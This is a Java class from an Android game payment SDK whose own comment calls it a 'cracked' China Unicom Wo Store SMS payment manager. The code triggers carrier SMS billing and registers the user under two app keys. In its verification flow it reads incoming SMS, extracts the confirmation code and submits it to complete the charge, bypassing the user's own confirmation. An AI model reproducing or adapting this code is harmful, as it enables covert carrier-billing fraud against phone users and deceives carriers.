package mobi.zty.pay.sdk.ananwosmsFee;

import java.util.HashMap;
import java.util.Map;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.Util_G;
import mz.mm.api.CodePay;
import mz.mm.api.MMApiException;
import mz.mm.api.SMSResponse;
import mz.mm.api.android.MMApi;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 * 联通沃商店弱联网破解支付管理类
 * @author Administrator
 *
 */
public class WoSmsFeeInstance extends PaymentInterf{
	private static WoSmsFeeInstance instance;
	private Handler callBHandler = null;
	private Map<String, SMSResponse> mapSmsResponse = new HashMap<String, SMSResponse>();
	private String payCode;
	private CodePay codepay;
	private Map<String, Boolean> appKeyInitMap = new HashMap<String, Boolean>();
	public static WoSmsFeeInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized WoSmsFeeInstance scyMMpay(){
		if(instance==null){
			instance =  new WoSmsFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(final Context context, Object... parameters) {
		if (callBHandler==null) {
			callBHandler = (Handler) parameters[0];
		}
		FeeInfo info = (FeeInfo) parameters[1];
		if(info == null){
			Util_G.debugE("init-->>", "初始化失败，后台没有配置参数");
			return;
		}
		final String appKey = info.sdkPayInfo.spKey;
//		final String appKey2 = "s"+appKey;
		final String channelId = info.sdkPayInfo.spChannel;
		if ((appKeyInitMap.containsKey(appKey)&&appKeyInitMap.get(appKey))) {//||!appKey.matches("[0-9]+")) {//不需要重复的刷用户
			return;
		}
		activeLTUser(context, appKey, channelId, null);
		
	}

	private void activeLTUser(final Context context, final String appKey, final String spChannel,
			final FeeInfo feeInfo) {
		// TODO Auto-generated method stub
		appKeyInitMap.put(appKey, true);
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				// TODO Auto-generated method stub
				try {
					MMApi.appStart((Activity) context, appKey, spChannel);
					MMApi.appStart((Activity) context, "s"+appKey, spChannel);
					Util_G.debugE("WoSmsFeeInstance-->>", "wosms init suss!"+",appKey="+appKey);
					if(feeInfo != null){
						realyPay(context, feeInfo.orderId, feeInfo);
					}
				} catch (MMApiException e) {
					// TODO Auto-generated catch block
					appKeyInitMap.put(appKey, false);
					if (feeInfo != null) {
						notiFyResult(PayConfig.SP_INIT_FAIL,"安安联通初始化失败",feeInfo.orderId);
					}
					e.printStackTrace();
				}
			}
		}).start();
	}
	
	/**
	 * 支付结果通知 
	 * @param sendSucc 1成功
	 */
	@Override
	public void notifyPay(Object... parameters){
		final int sendSucc = (Integer) parameters[0];
		final String orderId = (String) parameters[1];
		final FeeInfo feeInfo = GameSDK.getInstance().getFeeInfoByOrderId(orderId);
		if (feeInfo==null) return;
		SMSResponse response = mapSmsResponse.get(orderId);
		if (response == null) return;
		switch (sendSucc) {
		case 1://支付成功
			response.sendMessageSuccess();
			Helper.sendPayMessageToServer(PayConfig.WOSMS_PAY, "通知anan联通支付成功!", feeInfo.orderId);
			break;
		default://支付失败
			response.sendMessageFailed();
			Helper.sendPayMessageToServer(PayConfig.WOSMS_PAY, "通知anan联通支付失败!",  feeInfo.orderId);
			break;
		}
		mapSmsResponse.remove(feeInfo.orderId);
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		
		final FeeInfo feeInfo = (FeeInfo) parameters[0];
		if (feeInfo==null||feeInfo.sdkPayInfo==null) {
			notiFyResult(PayConfig.SDK_INFO_NULL, "后台没给计费点","");
			Helper.sendPayMessageToServer(PayConfig.WOSMS_PAY, "后台没给计费点", feeInfo.orderId);
			return;
		};
//		final String appKey = feeInfo.sdkPayInfo.spKey;
		Helper.sendPayMessageToServer(PayConfig.WOSMS_PAY, "进入支付", feeInfo.orderId);
		String appKey = feeInfo.sdkPayInfo.spKey;
		if (!(appKeyInitMap.containsKey(appKey)&&appKeyInitMap.get(appKey))) {
			Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "另一套计费需要重新初始化", feeInfo.orderId);
			activeLTUser(context, appKey, feeInfo.sdkPayInfo.spChannel, feeInfo);
		}else{
			realyPay(context, feeInfo.orderId,feeInfo);
		}
	}
	
	private void notiFyResult(int resutCode,String retMsg,String orderId) {
		SMSResponse response = mapSmsResponse.get(orderId);
		if(response!=null){
			response.sendMessageFailed();
		}
		PayResultInfo info = new PayResultInfo();
		info.resutCode = resutCode;
		info.retMsg = retMsg;
		info.orderId = orderId;
		Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
		message.obj = info;
		message.sendToTarget();
	}
	private void realyPay(final Context context, final String orderId, final FeeInfo feeInfo) {
		payCode = feeInfo.sdkPayInfo.payCode;
//		final String appID = feeInfo.sdkPayInfo.appId;
//		payCode=String.format("%s%02d", appID,Integer.parseInt(payCode));
		final String appkey = feeInfo.sdkPayInfo.spKey;
		final String appKey2 = "s"+appkey;
		final String channelId = feeInfo.sdkPayInfo.spChannel;
		int needSms = feeInfo.verify;
		if(needSms == 0){//弱联网支付流程
			Helper.sendPayMessageToServer(PayConfig.WOSMS_PAY, "参数没问题执行弱联网支付payCode="+payCode+"appkey1="
					+appkey+"channelId="+channelId, "00000000000");
			new Thread(new Runnable() {
				@Override
				public void run() {
					PayResultInfo info = new PayResultInfo();
					info.orderId = feeInfo.orderId;
					try {
						SMSResponse response = MMApi.getSms(context, appkey, Long.parseLong(payCode),
								channelId, feeInfo.orderId);
						mapSmsResponse.put(feeInfo.orderId, response);
						if (!response.isMustSend()) {
							notiFyResult(PayConfig.BIIL_SUCC, "强联网没必要发送短信 视为成功", feeInfo.orderId);
							Helper.sendPayMessageToServer(PayConfig.WOSMS_PAY, info.retMsg, feeInfo.orderId);
							notifyPay(1,feeInfo.orderId);
						}else{
							Intent itSend = new Intent("SENT_SMS_ACTION");  
							itSend.putExtra("order_id", feeInfo.orderId);
					        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
					        response.requestSendMessage(mSendPI, null);
					        Helper.sendPayMessageToServer(PayConfig.WOSMS_PAY, "发送短信start", feeInfo.orderId);
						}
				        
					} catch (Exception e) {
						info.resutCode = PayConfig.SP_PAY_EXPTION;
						info.retMsg = e.getMessage();
						Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						Helper.sendPayMessageToServer(PayConfig.WOSMS_PAY, info.retMsg, info.orderId);
						e.printStackTrace();
					}
				}
			}).start();
		}else{//验证码支付流程
			Helper.sendPayMessageToServer(PayConfig.WOSMS_PAY, "参数没问题执行强联网（验证码）支付payCode="+payCode+"appkey2="+appKey2+"channelId="+channelId, "00000000000");
			new Thread(new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					try {
						codepay = MMApi.createCodePay(context, appKey2, Long.parseLong(payCode), channelId, orderId);
						
					} catch (NumberFormatException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					} catch (MMApiException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}).start();
		}
	}
	
	@Override
	public void sendVerifyCode(Object... parameters) {
		// TODO Auto-generated method stub
		String sendFrom = (String) parameters[0];
		String content = (String) parameters[1];
		final String orderId = (String) parameters[2];
		final FeeInfo feeinfo =  GameSDK.getInstance().getFeeInfoByOrderId(orderId);
		if(feeinfo == null || feeinfo.verifyInfo == null){
			return;
		}
		String vertifyNum=feeinfo.verifyInfo.vertifyNum;
//		if(feeinfo.verifyInfo.vertifyNum!=null&&feeinfo.verifyInfo.vertifyNum.length>0){
//			vertifyNum = feeinfo.verifyInfo.vertifyNum;
//		}
		Util_G.debugE("ALLPAY","vertifyNum——》》"+vertifyNum +"  content==>"+content);
		if (sendFrom.contains(vertifyNum)) {
			Util_G.debugE("ALLPAY", "vertifyNum——》》开始读取验证码");
			int startIndex = -1;
			int endIndex = 1;
			int length = feeinfo.verifyInfo.digitalLength;
			String munber = "0123456789";
			for (int i = 0; i < content.length(); i++) {
				String cr = content.charAt(i) + "";
				if (startIndex < 0 && munber.contains(cr)) {
					startIndex = i;
				} else if (startIndex >= 0 && !munber.contains(cr)) {
					endIndex = i;
					if (endIndex - startIndex < length) {
						startIndex = -1;
						continue;
					} else {
						break;
					}
				}
			}
			final String vetif_vode = content.substring(startIndex, endIndex);
			Util_G.debugE("ALLPAY", "vertifyNum——》》" + vetif_vode);
			Helper.sendPayMessageToServer(PayConfig.WOSMS_PAY, "读取到验证码vertifyNum="+vetif_vode, orderId);

			new Thread(new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					try {
						boolean issuss = codepay.requestPay(vetif_vode);
						if(issuss){
							notiFyResult(PayConfig.BIIL_SUCC, "安安联通支付成功", orderId);
							Helper.sendPayMessageToServer(PayConfig.WOSMS_PAY, "安安联通支付成功", orderId);
						}else{
							notiFyResult(PayConfig.SP_PAY_FAIL, "安安联通支付失败！", orderId);
							Helper.sendPayMessageToServer(PayConfig.WOSMS_PAY, "安安联通支付失败", orderId);
						}
					} catch (MMApiException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}).start();
		
		}
		super.sendVerifyCode(parameters);
	}
}
